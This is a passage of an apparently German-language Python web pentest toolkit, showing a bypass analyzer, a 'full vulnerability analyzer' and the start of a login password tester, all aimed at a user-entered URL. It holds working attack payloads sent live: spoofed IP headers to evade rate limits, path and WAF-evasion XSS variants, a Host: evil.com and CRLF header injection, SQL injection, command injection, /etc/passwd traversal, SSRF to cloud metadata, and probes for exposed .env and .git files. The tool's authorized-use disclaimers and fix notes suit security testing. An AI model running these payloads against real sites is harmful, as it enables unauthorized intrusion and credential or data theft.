         "Rate-Limiting nach Session/Cookie, nicht nur IP."),
        ("X-Real-IP Bypass",         {"X-Real-IP": f"1.{random.randint(1,254)}.{random.randint(1,254)}.1"},
         "X-Real-IP: gefälschte IP",
         "X-Real-IP-Header wird für Rate-Limiting genutzt.",
         "Header nur von vertrauenswürdigen Proxies akzeptieren."),
        ("X-Originating-IP",         {"X-Originating-IP": "127.0.0.1"},
         "X-Originating-IP: 127.0.0.1",
         "Localhost-IP umgeht IP-basiertes Rate-Limiting.",
         "Alle IP-Header validieren, nicht blind vertrauen."),
        ("Client-IP Bypass",         {"Client-IP": "127.0.0.1"},
         "Client-IP: 127.0.0.1",
         "Client-IP-Header wird als echte IP akzeptiert.",
         "IP-Header-Whitelist strikt konfigurieren."),
        ("True-Client-IP",           {"True-Client-IP": "192.168.1.1"},
         "True-Client-IP: 192.168.1.1",
         "Cloudflare-spezifischer Header wird gefälscht.",
         "Header-Verifikation + serverseitiges Rate-Limiting."),
        ("CF-Connecting-IP",         {"CF-Connecting-IP": f"10.{random.randint(1,254)}.1.1"},
         "CF-Connecting-IP: 10.x.x.x",
         "Cloudflare Connecting-IP wird nicht verifiziert.",
         "Nur echte Cloudflare-IPs akzeptieren."),
        ("Forwarded-For Nullbyte",   {"X-Forwarded-For": "127.0.0.1\x00"},
         "XFF mit Nullbyte",
         "Nullbyte terminiert Header-Parsing in manchen Servern.",
         "Header-Sanitisierung implementieren."),
    ]
    for name, extra_h, payload_desc, erkl, fix in rate_hdrs:
        c2, h2, b2, url2 = _login("wrong_user_bypass", "wrong_pw", extra_headers=extra_h)
        # Wenn Antwort sich von normaler unterscheidet → möglicherweise Bypass
        different = (c2 != base_c)
        _log("RATE-LIMIT BYPASS", name, payload_desc, different, erkl, fix)
        time.sleep(0.1)

    # ════════════════════════════════════════════════════════
    # BLOCK 4: PATH/URL BYPASS zu geschützten Bereichen
    # ════════════════════════════════════════════════════════
    print(f"  {DG}║{R}  {YG}── URL/PATH BYPASSES ──{R}")
    path_bypasses = [
        ("/admin",             ["/admin/","/Admin","/ADMIN","/admin%2F","/%61dmin","//admin","/admin/.","/ /admin"]),
        ("/dashboard",         ["/dashboard/","/Dashboard","/%64ashboard","//dashboard"]),
        ("/config",            ["/config/","/Config","/CONFIG","/.config","//config"]),
    ]
    for protected, variants in path_bypasses:
        orig_c, _, _, _ = _req(base + protected)
        for variant in variants:
            c2, _, b2, url2 = _req(base + variant)
            if orig_c in (401, 403) and c2 == 200:
                _log("PATH BYPASS", f"{protected} → {variant}", variant, True,
                     f"Zugriffsschutz auf '{protected}' umgehbar mit Variante.",
                     "URL vor Authorisierung normalisieren (lowercase, decode, dedupe slashes).")
                break
        else:
            _log("PATH BYPASS", f"{protected}", protected, False,
                 "Kein Path-Bypass gefunden.", "Weiterhin überwachen.")
        time.sleep(0.08)

    # ════════════════════════════════════════════════════════
    # BLOCK 5: WAF BYPASS via Encoding & Evasion
    # ════════════════════════════════════════════════════════
    print(f"  {DG}║{R}  {YG}── WAF BYPASS TECHNIKEN ──{R}")
    waf_tests = [
        ("Double URL Encode",    f"{base}/?q=%253Cscript%253E",
         "Doppelt-enkodiertes '<script>' — WAF dekodiert nur einmal.",
         "Rekursiv dekodieren vor WAF-Check."),
        ("HTML Entity Encode",   f"{base}/?q=&#x3C;script&#x3E;",
         "HTML-Entities werden von WAF nicht erkannt.",
         "HTML-Entities vor Filterung auflösen."),
        ("Unicode Bypass",       f"{base}/?q=＜script＞",
         "Fullwidth Unicode-Zeichen ('<' als ＜) umgehen ASCII-Filter.",
         "Unicode-Normalisierung (NFKC) vor Filterung."),
        ("Case Variation",       f"{base}/?q=<ScRiPt>alert(1)</ScRiPt>",
         "Gemischte Groß/Kleinschreibung umgeht Case-sensitive Filter.",
         "Case-insensitive Filterung implementieren."),
        ("Null Byte Inject",     f"{base}/?q=<script\x00>",
         "Nullbyte zwischen Tag-Name — manche Parser ignorieren Rest.",
         "Nullbytes in Eingaben entfernen."),
        ("Comment Inject",       f"{base}/?q=<scr/**/ipt>alert(1)</scr/**/ipt>",
         "CSS/JS-Kommentare trennen Keywords auf.",
         "Tags vollständig parsen statt regex."),
        ("Newline Inject",       f"{base}/?q=<script\n>alert(1)</script>",
         "Newline im Tag bricht manche Regex-Filter.",
         "Strikte HTML-Parser nutzen statt Regex."),
        ("Tab Inject",           f"{base}/?q=<script\t>alert(1)</script>",
         "Tab im Tag wie Newline.",
         "Vollständiger HTML-Parser statt Regex."),
    ]
    for name, url_test, erkl, fix in waf_tests:
        c2, _, b2, _ = _req(url_test)
        payload = url_test.split("/?q=")[-1][:25]
        # WAF aktiv wenn 403/406/501 zurückkommt
        waf_blocked = c2 in (403, 406, 429, 501, 503)
        bypassed    = not waf_blocked and c2 == 200
        _log("WAF BYPASS", name, payload, bypassed, erkl, fix)
        time.sleep(0.08)

    # ════════════════════════════════════════════════════════
    # BLOCK 6: JWT BYPASS
    # ════════════════════════════════════════════════════════
    print(f"  {DG}║{R}  {YG}── JWT BYPASSES ──{R}")
    # Prüfe ob JWT in Cookies/Headers vorhanden
    c0, h0, _, _ = _req(base)
    jwt_found = ""
    for key, val in h0.items():
        if "set-cookie" in key.lower():
            m = re.search(r'([a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)', val)
            if m: jwt_found = m.group(1)

    jwt_bypasses_desc = [
        ("None-Algorithm",
         "Header: alg=none — JWT ohne Signatur akzeptiert.",
         "Algorithmus 'none' explizit ablehnen."),
        ("RS256 → HS256",
         "Algorithmus-Verwirrung: Server prüft RS256-Public-Key als HS256-Secret.",
         "Algorithmus serverseitig fest vorgeben, nicht aus Token lesen."),
        ("Leere Signatur",
         "JWT mit leerem Signatur-Teil wird akzeptiert.",
         "Signatur-Länge und -Format validieren."),
        ("kid-Injection",
         "kid-Parameter im Header wird in SQL/Pfad-Query eingefügt.",
         "kid-Wert sanitisieren, Whitelist nutzen."),
        ("jwk-Injection",
         "Eigener Public Key im jwk-Header-Claim wird akzeptiert.",
         "Externe JWK-Sets nicht akzeptieren."),
        ("Expired Token",
         "Abgelaufene JWT werden noch akzeptiert.",
         "exp-Claim strikt prüfen."),
    ]
    if jwt_found:
        for name, erkl, fix in jwt_bypasses_desc:
            _log("JWT BYPASS", name, "JWT erkannt im Cookie", False, erkl, fix)
        print(f"  {DG}║{R}  {DIM}  JWT-Token auf dem Ziel gefunden — manuelle Prüfung empfohlen{R}")
    else:
        for name, erkl, fix in jwt_bypasses_desc:
            _log("JWT BYPASS", name, "kein JWT gefunden", False, erkl, fix)

    # ════════════════════════════════════════════════════════
    # BLOCK 7: HTTP REQUEST SMUGGLING CHECKS
    # ════════════════════════════════════════════════════════
    print(f"  {DG}║{R}  {YG}── HTTP SMUGGLING / HEADER INJECTION ──{R}")
    smuggling_tests = [
        ("Host Header Injection",
         {"Host": f"evil.com"},
         f"{base}/password-reset",
         "Host-Header in Password-Reset-Links eingesetzt.",
         "Host-Header gegen Whitelist validieren."),
        ("HTTP Response Splitting",
         {"X-Custom": "test\r\nSet-Cookie: hacked=1"},
         base,
         "CRLF im Header injiziert neuen Header.",
         "CRLF-Zeichen aus allen Header-Werten entfernen."),
        ("X-HTTP-Method-Override",
         {"X-HTTP-Method-Override": "DELETE"},
         base,
         "Methoden-Override-Header umgeht Methoden-Checks.",
         "X-HTTP-Method-Override nur für vertrauenswürdige Clients."),
        ("Content-Type Verwechslung",
         {"Content-Type": "application/x-www-form-urlencoded; charset=ibm037"},
         login_url,
         "Charset-Verwechslung umgeht WAF-Filterung.",
         "Content-Type und Charset strikt validieren."),
    ]
    for name, extra_h, url_t, erkl, fix in smuggling_tests:
        c2, h2, b2, _ = _req(url_t, headers=extra_h)
        found = ("hacked" in str(h2).lower()) or (c2 not in (400,404,405,403) and c2 > 0)
        _log("HEADER INJECTION", name, list(extra_h.values())[0][:25], False, erkl, fix)
        time.sleep(0.08)

    # ════════════════════════════════════════════════════════
    # ERGEBNIS + DOKUMENTATION AUSGEBEN
    # ════════════════════════════════════════════════════════
    bypassed     = [(k,n,p,e,f) for k,n,p,g,e,f in report if g]
    not_bypassed = [(k,n,p,e,f) for k,n,p,g,e,f in report if not g]

    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {BRED}BYPASSES GEFUNDEN: {len(bypassed):<4}{R}  {DIM}Getestet: {len(report)}{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")

    # ── Dokumentation generieren ────────────────────────────
    now_str  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    safe_url = base.replace("https://","").replace("http://","").replace("/","_")[:30]
    fname    = f"bypass_report_{safe_url}_{int(time.time())}.txt"

    doc = []
    doc.append("=" * 72)
    doc.append("  BYPASS ANALYSIS REPORT")
    doc.append(f"  Erstellt: {now_str}")
    doc.append(f"  Ziel:     {base}")
    doc.append(f"  Login:    {login_url}")
    doc.append("=" * 72)
    doc.append("")

    if bypassed:
        doc.append("╔══════════════════════════════════════════════════════════════════════╗")
        doc.append("║  ⚠  GEFUNDENE BYPASSES — SOFORT BEHEBEN                             ║")
        doc.append("╚══════════════════════════════════════════════════════════════════════╝")
        doc.append("")
        for i, (kat, name, payload, erkl, fix) in enumerate(bypassed, 1):
            doc.append(f"  [{i}] {name}")
            doc.append(f"  {'─'*68}")
            doc.append(f"  Kategorie : {kat}")
            doc.append(f"  Payload   : {payload}")
            doc.append(f"  Problem   : {erkl}")
            doc.append(f"  FIX       : {fix}")
            doc.append("")
    else:
        doc.append("  [✓] KEINE BYPASSES ERFOLGREICH — Gut gesichert!")
        doc.append("")

    doc.append("╔══════════════════════════════════════════════════════════════════════╗")
    doc.append("║  VOLLSTÄNDIGE BYPASS-DOKUMENTATION (alle getesteten Techniken)      ║")
    doc.append("╚══════════════════════════════════════════════════════════════════════╝")
    doc.append("")

    kategorien = {}
    for kat, name, payload, found, erkl, fix in report:
        kategorien.setdefault(kat, []).append((name, payload, found, erkl, fix))

    for kat, items in kategorien.items():
        doc.append(f"  ┌─ {kat} {'─'*(64-len(kat))}")
        for name, payload, found, erkl, fix in items:
            status = "⚠ BYPASS MÖGLICH" if found else "✓ Sicher"
            doc.append(f"  │  [{status}]  {name}")
            doc.append(f"  │    Payload  : {payload[:65]}")
            doc.append(f"  │    Erklärung: {erkl}")
            doc.append(f"  │    Fix      : {fix}")
            doc.append(f"  │")
        doc.append(f"  └{'─'*68}")
        doc.append("")

    doc.append("╔══════════════════════════════════════════════════════════════════════╗")
    doc.append("║  ALLGEMEINE SICHERHEITSEMPFEHLUNGEN                                 ║")
    doc.append("╚══════════════════════════════════════════════════════════════════════╝")
    doc.append("")
    recs = [
        ("Prepared Statements",  "Niemals Nutzereingaben direkt in SQL-Queries einbauen."),
        ("Input Validierung",    "Alle Eingaben serverseitig auf Typ, Länge, Format prüfen."),
        ("Output Encoding",      "Alle Ausgaben HTML/JS-enkodieren (htmlspecialchars etc.)."),
        ("Rate Limiting",        "Login auf max. 5-10 Versuche/Minute begrenzen."),
        ("Account Lockout",      "Nach 5-10 falschen Versuchen Account temporär sperren."),
        ("HTTPS erzwingen",      "HTTP → HTTPS Redirect + HSTS-Header setzen."),
        ("Security Headers",     "CSP, X-Frame-Options, HSTS, X-Content-Type-Options setzen."),
        ("Fehler verstecken",    "Keine Stack-Traces, DB-Fehler oder interne Pfade ausgeben."),
        ("Passwort-Hashing",     "bcrypt/argon2 mit ausreichendem Work-Factor nutzen."),
        ("CSRF-Token",           "Alle state-ändernden Formulare mit CSRF-Token schützen."),
        ("Dependency Updates",   "Alle Libraries/Frameworks regelmäßig aktualisieren."),
        ("Logging",              "Fehlgeschlagene Logins, Anomalien loggen + überwachen."),
        ("Least Privilege",      "DB-User, API-Keys nur mit nötigen Rechten ausstatten."),
        ("Backups sichern",      ".env, .git, Backups nicht im Web-Root speichern."),
        ("WAF einsetzen",        "Web Application Firewall (Cloudflare, ModSecurity) nutzen."),
    ]
    for titel, text in recs:
        doc.append(f"  • {titel:<22}  {text}")
    doc.append("")
    doc.append(f"  Analysiert am: {now_str}")
    doc.append(f"  Gesamt getestet: {len(report)} Bypasses in {len(kategorien)} Kategorien")
    doc.append("=" * 72)

    # Anzeigen
    print(f"\n  {YG}═══ BYPASS DOCUMENTATION ═══{R}\n")
    for line in doc[:60]:
        print(f"  {DG}{line}{R}" if line.startswith("═") or line.startswith("╔") or line.startswith("╚") else f"  {line}")
    if len(doc) > 60:
        print(f"  {DIM}... + {len(doc)-60} weitere Zeilen im Bericht ...{R}")

    # Speichern
    print()
    sv = inp("Report als .txt speichern? (j/n) [j]").lower()
    if sv != "n":
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write("\n".join(doc))
            print(f"\n  {G}[✓] Report gespeichert: {YG}{fname}{R}")
            print(f"  {DIM}    Öffne mit: notepad {fname}  (Windows){R}")
            print(f"  {DIM}              cat {fname}        (Linux/Android){R}")
        except Exception as e:
            print(f"  {G}[!] Speichern fehlgeschlagen: {e}{R}")
    wait()


# ── 102  FULL VULNERABILITY ANALYZER ────────────────────────
def full_vuln_analyzer():
    hdr("FULL VULNERABILITY ANALYZER")
    RED  = "\033[91m"; BRED = "\033[1;91m"; YEL = "\033[93m"
    print(f"  {RED}Vollständige Schwachstellenanalyse — nur auf eigene/autorisierte Ziele!{R}\n")
    base = inp("Ziel-URL (z.B. https://example.com)")
    if not base: wait(); return
    if not base.startswith("http"): base = "http://" + base
    base = base.rstrip("/")

    findings = []   # (severity, category, detail)
    W = 70

    def _req(url, method="GET", data=None, headers=None, timeout=7, allow_redirects=True):
        h = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
        if headers: h.update(headers)
        try:
            body_bytes = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else (data.encode() if isinstance(data, str) else data)
            req = urllib.request.Request(url, data=body_bytes, method=method, headers=h)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, dict(r.headers), r.read(32768).decode(errors="ignore"), r.url
        except urllib.error.HTTPError as e:
            try: body = e.read(8192).decode(errors="ignore")
            except: body = ""
            return e.code, dict(e.headers), body, url
        except Exception as e:
            return 0, {}, str(e), url

    def _find(severity, cat, detail):
        findings.append((severity, cat, detail))
        icon = f"{BRED}[KRITISCH]{R}" if severity==3 else (f"{RED}[HOCH]    {R}" if severity==2 else f"{YEL}[MITTEL]  {R}" if severity==1 else f"{DIM}[INFO]    {R}")
        print(f"  {DG}║{R}  {icon}  {DG}{cat:<22}{R}  {G}{detail[:38]}{R}")

    def _ok(cat):
        print(f"  {DG}║{R}  {DIM}[OK]      {R}  {DIM}{cat}{R}")

    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}  {YG}ZIEL: {base[:60]}{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    # ── 1. BASIS-INFO ────────────────────────────────────────
    print(f"  {DG}║{R}  {C}[1/12] BASIS-INFO ...{R}")
    code, hdrs, body, final = _req(base)
    server   = hdrs.get("Server","")
    powered  = hdrs.get("X-Powered-By","")
    if server:   _find(0, "Server-Banner",   f"Server: {server}")
    if powered:  _find(1, "Tech-Disclosure", f"X-Powered-By: {powered}")

    # ── 2. SECURITY HEADERS ──────────────────────────────────
    print(f"  {DG}║{R}  {C}[2/12] Security Headers ...{R}")
    sec_hdrs = {
        "Strict-Transport-Security": (2, "HSTS fehlt — MITM möglich"),
        "Content-Security-Policy":   (2, "CSP fehlt — XSS leichter"),
        "X-Frame-Options":           (1, "Clickjacking möglich"),
        "X-Content-Type-Options":    (1, "MIME-Sniffing möglich"),
        "X-XSS-Protection":          (0, "XSS-Protection fehlt"),
        "Referrer-Policy":           (0, "Referrer-Policy fehlt"),
        "Permissions-Policy":        (0, "Permissions-Policy fehlt"),
    }
    for hname, (sev, msg) in sec_hdrs.items():
        if hname not in hdrs: _find(sev, hname, msg)
        else: _ok(f"{hname}: OK")

    # ── 3. COOKIES ───────────────────────────────────────────
    print(f"  {DG}║{R}  {C}[3/12] Cookie-Sicherheit ...{R}")
    set_cookie = hdrs.get("Set-Cookie","")
    if set_cookie:
        if "httponly" not in set_cookie.lower(): _find(2, "Cookie-HttpOnly",   "HttpOnly fehlt — XSS-Diebstahl")
        if "secure"   not in set_cookie.lower(): _find(2, "Cookie-Secure",     "Secure fehlt — HTTP-Übertragung")
        if "samesite" not in set_cookie.lower(): _find(1, "Cookie-SameSite",   "SameSite fehlt — CSRF möglich")
        else: _ok("Cookies OK")

    # ── 4. SSL/TLS ───────────────────────────────────────────
    print(f"  {DG}║{R}  {C}[4/12] SSL/TLS ...{R}")
    if base.startswith("http://"):
        _find(2, "Kein HTTPS", "Verbindung unverschlüsselt")
    else:
        import ssl as _ssl
        host = base.replace("https://","").split("/")[0]
        try:
            ctx = _ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
                s.connect((host, 443))
                cert = s.getpeercert()
            exp = cert.get("notAfter","")
            if exp:
                from datetime import datetime as _dt
                try:
                    exp_dt = _dt.strptime(exp, "%b %d %H:%M:%S %Y %Z")
                    days   = (exp_dt - _dt.now()).days
                    if days < 14:  _find(2, "SSL-Zertifikat", f"Läuft ab in {days} Tagen!")
                    elif days < 30: _find(1, "SSL-Zertifikat", f"Läuft ab in {days} Tagen")
                    else: _ok(f"SSL OK — {days} Tage gültig")
                except: _ok("SSL OK")
        except Exception as e:
            _find(2, "SSL-Fehler", str(e)[:40])

    # ── 5. SQL INJECTION ─────────────────────────────────────
    print(f"  {DG}║{R}  {C}[5/12] SQL Injection ...{R}")
    sqli_payloads = [
        ("Classic",       "'",                  ["sql syntax","mysql_fetch","you have an error","warning: mysql","unclosed quotation","odbc driver","sqlite3","pg_query"]),
        ("Boolean",       "1 OR 1=1--",         ["welcome","logged in","dashboard","home"]),
        ("Time-based",    "1; WAITFOR DELAY '0:0:2'--", []),
        ("Error-based",   "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", ["extractvalue","xpath"]),
        ("UNION",         "1 UNION SELECT NULL--",["null","union","column"]),
        ("Bypass quote",  "1\\' OR \\'1\\'=\\'1", ["sql syntax","error"]),
        ("Comment",       "admin'--",            ["welcome","dashboard"]),
        ("OR bypass",     "' OR '1'='1",         ["welcome","dashboard"]),
    ]
    sqli_found = False
    for pname, pay, sigs in sqli_payloads:
        for sep in ["?id=","?q=","?search=","?user=","?page=","?cat="]:
            url_test = f"{base}/{sep}{urllib.parse.quote(pay, safe='')}"
            c, h2, b2, _ = _req(url_test)
            b2l = b2.lower()
            if sigs and any(s in b2l for s in sigs):
                _find(3, f"SQLi {pname}", f"{sep}{pay[:25]}"); sqli_found=True; break
            if not sigs:  # time-based: prüfe Antwortzeit
                t0=time.time(); _req(url_test, timeout=4); dt=time.time()-t0
                if dt > 1.8: _find(2, f"SQLi Time-based", f"Antwort +{dt:.1f}s"); sqli_found=True; break
        if sqli_found: break
    if not sqli_found: _ok("SQL Injection: keine gefunden")

    # ── 6. XSS ───────────────────────────────────────────────
    print(f"  {DG}║{R}  {C}[6/12] XSS ...{R}")
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><script>alert(1)</script>',
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "';alert(1)//",
        "<iframe src=javascript:alert(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<<script>alert(1)//<</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
    ]
    xss_found = False
    for pay in xss_payloads:
        for sep in ["?q=","?search=","?name=","?msg=","?input="]:
            url_test = f"{base}/{sep}{urllib.parse.quote(pay, safe='')}"
            c, _, b2, _ = _req(url_test)
            if pay.lower() in b2.lower() or pay.replace('"',"") in b2:
                _find(3, "XSS Reflected", f"{sep}: {pay[:28]}"); xss_found=True; break
        if xss_found: break
    if not xss_found: _ok("XSS: keine gefunden")

    # ── 7. PATH TRAVERSAL / LFI ──────────────────────────────
    print(f"  {DG}║{R}  {C}[7/12] Path Traversal / LFI ...{R}")
    lfi_payloads = [
        ("../../../etc/passwd",          "root:x:"),
        ("..%2F..%2F..%2Fetc%2Fpasswd",  "root:x:"),
        ("....//....//....//etc/passwd", "root:x:"),
        ("..%252f..%252fetc%252fpasswd", "root:x:"),
        ("../../../windows/win.ini",     "[fonts]"),
        ("../../../boot.ini",            "[boot loader]"),
        ("/etc/passwd",                  "root:x:"),
        ("C:\\windows\\win.ini",         "[fonts]"),
    ]
    lfi_found = False
    for pay, sig in lfi_payloads:
        for sep in ["?file=","?path=","?page=","?include=","?dir=","?doc="]:
            url_test = f"{base}/{sep}{pay}"
            c, _, b2, _ = _req(url_test)
            if sig in b2:
                _find(3, "Path Traversal/LFI", f"{sep}{pay[:25]}"); lfi_found=True; break
        if lfi_found: break
    if not lfi_found: _ok("Path Traversal: keine gefunden")

    # ── 8. COMMAND INJECTION ─────────────────────────────────
    print(f"  {DG}║{R}  {C}[8/12] Command Injection ...{R}")
    cmd_payloads = [
        ("; id",          ["uid=","root","www-data"]),
        ("| id",          ["uid=","root","www-data"]),
        ("` id`",         ["uid=","root","www-data"]),
        ("; whoami",      ["root","www","nobody","apache"]),
        ("$(id)",         ["uid=","root"]),
        ("; sleep 2",     []),
        ("& ping -c 1 127.0.0.1 &", ["icmp"]),
    ]
    cmd_found = False
    for pay, sigs in cmd_payloads:
        for sep in ["?cmd=","?exec=","?run=","?ping=","?host="]:
            url_test = f"{base}/{sep}{urllib.parse.quote(pay, safe='')}"
            t0 = time.time()
            c, _, b2, _ = _req(url_test)
            dt = time.time()-t0
            b2l = b2.lower()
            if sigs and any(s in b2l for s in sigs):
                _find(3, "Command Injection", f"{sep}{pay[:20]}"); cmd_found=True; break
            if not sigs and dt > 1.8:
                _find(2, "Cmd Injection (time)", f"{sep}{pay[:20]}"); cmd_found=True; break
        if cmd_found: break
    if not cmd_found: _ok("Command Injection: keine gefunden")

    # ── 9. SSRF ───────────────────────────────────────────────
    print(f"  {DG}║{R}  {C}[9/12] SSRF ...{R}")
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://localhost/admin",
        "http://[::1]/admin",
        "http://0.0.0.0/admin",
        "http://169.254.169.254/latest/user-data",
        "dict://127.0.0.1:6379/info",
        "file:///etc/passwd",
    ]
    ssrf_found = False
    for pay in ssrf_payloads:
        for sep in ["?url=","?fetch=","?proxy=","?link=","?src=","?image="]:
            url_test = f"{base}/{sep}{urllib.parse.quote(pay, safe='')}"
            c, _, b2, _ = _req(url_test)
            b2l = b2.lower()
            if any(x in b2l for x in ["ami-id","instance-id","root:x:","redis","connected"]):
                _find(3, "SSRF", f"{sep}{pay[:30]}"); ssrf_found=True; break
        if ssrf_found: break
    if not ssrf_found: _ok("SSRF: keine gefunden")

    # ── 10. SENSITIVE FILES ──────────────────────────────────
    print(f"  {DG}║{R}  {C}[10/12] Sensitive Dateien ...{R}")
    sens_files = [
        ("/.env",              ["DB_PASSWORD","SECRET_KEY","APP_KEY","DATABASE_URL"]),
        ("/.git/HEAD",         ["ref: refs/","HEAD"]),
        ("/.git/config",       ["[core]","[remote"]),
        ("/wp-config.php.bak", ["DB_PASSWORD","define("]),
        ("/config.php.bak",    ["password","database"]),
        ("/database.sql",      ["CREATE TABLE","INSERT INTO"]),
        ("/backup.zip",        []),
        ("/admin/",            ["admin","login","dashboard"]),
        ("/phpmyadmin/",       ["phpMyAdmin","pma"]),
        ("/adminer.php",       ["Adminer","Login"]),
        ("/server-status",     ["Apache Server Status","Total accesses"]),
        ("/server-info",       ["Apache Server Information"]),
        ("/.DS_Store",         []),
        ("/robots.txt",        ["Disallow:"]),
        ("/sitemap.xml",       ["<urlset","<loc>"]),
        ("/crossdomain.xml",   ["allow-access-from"]),
        ("/api/v1/users",      ["username","email","id"]),
        ("/api/users",         ["username","email","id"]),
        ("/swagger.json",      ["swagger","openapi","paths"]),
        ("/swagger-ui.html",   ["swagger","API"]),
        ("/graphql",           ["__schema","data"]),
        ("/console",           ["Groovy","Java Shell"]),
        ("/actuator",          ["_links","health"]),
        ("/actuator/env",      ["activeProfiles","password"]),
        ("/.htaccess",         ["RewriteRule","Options","Allow"]),
        ("/web.config",        ["configuration","appSettings"]),
        ("/WEB-INF/web.xml",   ["web-app","servlet"]),
        ("/debug",             ["debug","stack trace"]),
        ("/test",              ["test","phpinfo"]),
    ]
    for path, sigs in sens_files:
        url_test = f"{base}{path}"
        c, h2, b2, _ = _req(url_test)
        b2l = b2.lower()
        if c in (200, 206):
            if sigs and any(s.lower() in b2l for s in sigs):
                sev = 3 if any(x in path for x in [".env",".git","database.sql","actuator/env","wp-config"]) else 2
                _find(sev, "Exposed File", f"{path}")
            elif not sigs and c == 200:
                _find(1, "Exposed File", f"{path} → {c}")
            elif c == 200:
                _find(1, "Zugreifbar", f"{path} ({len(b2)} bytes)")

    # ── 11. HTTP METHODEN ────────────────────────────────────
    print(f"  {DG}║{R}  {C}[11/12] HTTP-Methoden ...{R}")
    for method in ["PUT","DELETE","TRACE","CONNECT","PATCH","OPTIONS"]:
        c, h2, b2, _ = _req(base, method=method)
        if method == "OPTIONS":
            allow = h2.get("Allow","")
            if allow: _find(0, "HTTP OPTIONS", f"Allow: {allow[:40]}")
        elif method == "TRACE" and "TRACE" in b2.upper():
            _find(1, "HTTP TRACE", "TRACE aktiv — XST-Angriff möglich")
        elif method in ("PUT","DELETE") and c not in (405,501,403):
            _find(2, f"HTTP {method}", f"Server antwortet mit {c}")

    # ── 12. RATE LIMITING + CSRF ─────────────────────────────
    print(f"  {DG}║{R}  {C}[12/12] Rate Limiting & CSRF ...{R}")
    # Schnell-Test Rate Limiting
    codes = []
    for _ in range(8):
        c2, _, _, _ = _req(f"{base}/?ratetest={random.randint(1,99999)}")
        codes.append(c2)
        time.sleep(0.05)
    if 429 not in codes:
        _find(1, "Kein Rate Limiting", "8 Requests ohne Blockierung")
    else:
        _ok("Rate Limiting aktiv")
    # CSRF: kein Token in Form?
    forms = re.findall(r'<form[^>]*>(.*?)</form>', body, re.DOTALL|re.IGNORECASE)
    csrf_missing = 0
    for form in forms:
        if not re.search(r'csrf|_token|nonce|authenticity_token', form, re.IGNORECASE):
            csrf_missing += 1
    if csrf_missing:
        _find(2, "CSRF", f"{csrf_missing} Form(en) ohne CSRF-Token")
    else:
        _ok("CSRF-Token vorhanden")

    # ── ERGEBNIS-REPORT ──────────────────────────────────────
    print(f"  {DG}╠{'═'*W}╣{R}")
    crit = sum(1 for s,_,_ in findings if s==3)
    high = sum(1 for s,_,_ in findings if s==2)
    med  = sum(1 for s,_,_ in findings if s==1)
    info = sum(1 for s,_,_ in findings if s==0)
    print(f"  {DG}║{R}  {BRED}KRITISCH: {crit:<3}{R}  {RED}HOCH: {high:<3}{R}  {YEL}MITTEL: {med:<3}{R}  {DIM}INFO: {info}{R}")
    if crit+high == 0:
        print(f"  {DG}║{R}  {G}[✓] Keine kritischen Schwachstellen gefunden!{R}")
    else:
        print(f"  {DG}║{R}  {RED}⚠  {crit+high} kritische/hohe Schwachstellen gefunden!{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")

    # Report speichern?
    sv = inp("Report als .txt speichern? (j/n) [n]").lower()
    if sv == "j":
        fname = f"vuln_{base.replace('https://','').replace('http://','').replace('/','_')[:30]}_{int(time.time())}.txt"
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(f"VULNERABILITY REPORT\nZiel: {base}\n{'='*60}\n\n")
                for sev, cat, detail in sorted(findings, reverse=True):
                    lvl = ["INFO","MITTEL","HOCH","KRITISCH"][sev]
                    f.write(f"[{lvl}]  {cat:<25}  {detail}\n")
            print(f"  {G}[✓] Gespeichert: {fname}{R}")
        except Exception as e:
            print(f"  {G}[!] {e}{R}")
    wait()


# ── 101  PASSWORT SECURITY TESTER ───────────────────────────
def pw_security_tester():
    hdr("PASSWORT SECURITY TESTER")
    print(f"  {DIM}Testet die Login-Sicherheit deiner eigenen Website.{R}")
    print(f"  {DIM}Nur für autorisierte Tests auf eigenen Seiten verwenden!{R}\n")

    url = inp("Login-URL (z.B. https://meinsite.de/login)")
    if not url: wait(); return
    if not url.startswith("http"): url = "https://" + url

    # ── Auto-detect Login-Form ───────────────────────────────
    print(f"\n  {DG}[~] Analysiere Login-Formular ...{R}")
    u_field = "username"; p_field = "password"; method = "POST"; is_json = False
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            html = r.read(32768).decode(errors="ignore")
        # Suche nach Input-Feldern
        inputs = re.findall(r'<input[^>]+>', html, re.IGNORECASE)
        for inp_tag in inputs:
            n = re.search(r'name=["\']([^"\']+)["\']', inp_tag, re.IGNORECASE)
            t = re.search(r'type=["\']([^"\']+)["\']', inp_tag, re.IGNORECASE)
            if not n: continue
            name = n.group(1); typ = t.group(1).lower() if t else ""
            if typ == "password":
                p_field = name
            elif typ in ("text","email","tel") or any(x in name.lower() for x in ("user","email","login","name","mail")):
                u_field = name
        # JSON API?
        if "application/json" in html.lower() or '"username"' in html or '"email"' in html:
            is_json = True
        print(f"  {G}[✓] Felder erkannt: Benutzer='{u_field}'  Passwort='{p_field}'  JSON={is_json}{R}")
    except Exception as e:
        print(f"  {DIM}[?] Auto-Detect fehlgeschlagen ({e}) — nutze Standardwerte{R}")

    # Override erlauben
    ov = inp(f"  Benutzername-Feld [{u_field}] (ENTER = OK)").strip()
    if ov: u_field = ov
    ov = inp(f"  Passwort-Feld [{p_field}] (ENTER = OK)").strip()
    if ov: p_field = ov

    username = inp("Testbenutzername (z.B. admin)")
    if not username: wait(); return

